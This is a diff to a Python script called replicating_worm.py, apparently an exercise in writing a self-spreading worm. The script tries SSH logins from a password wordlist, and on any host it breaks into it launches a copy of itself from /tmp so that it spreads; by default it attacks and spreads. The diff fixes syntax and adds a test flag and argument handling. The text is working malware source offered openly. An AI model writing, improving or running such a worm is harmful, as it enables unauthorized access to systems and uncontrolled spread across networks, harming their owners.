@@ -75,11 +75,11 @@ def attackHost(host):
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 	for (_username, _password) in wordList:
-		
 		try:
 			ssh.connect(host, username=_username, password=_password)
 			return (ssh, _username, _password)
 		except:
+			print("")
 
 	return None
 
@@ -106,19 +106,23 @@ def startAttacking(wormLocation, isHost):
 			sshInfo[0].exec_command("nohub python /tmp/replicating_worm.py &")
 
 		elif isHost:
-			print("Could not spread to this host: %s" + %(str(Host)))
+			print("Could not spread to this host: %s" %(str(Host)))
 	
 	
 def main(argv):
 
 	if len(argv) == 2:
 		if argv[1] == "-h":
-			print("Usage: python replicating_worm.py [-host | -h]\n-host this si the host system don't attack!\n-h Shows help screen\nDefault will attack host and spread")
+			print("Usage: python replicating_worm.py [-host | -h | -t]\n-host this si the host system don't attack!\n-h Shows help screen\nDefault will attack host and spread\n-t Will see if the functions work!")
 		elif argv[1] == "-host":
 			markSystem()
 			attackSystem("replicating_worm.py", True)
+		elif argv[1] == "-t":
+			print("Testing if everything works right")
+		else:
+			print("Don't understand argument!!\nTry again please")
 	else:
-		if !isTargetInfected():
+		if isTargetInfected() == False:
 			attackSystem("/tmp/replicating_worm.py", False)
 	
 
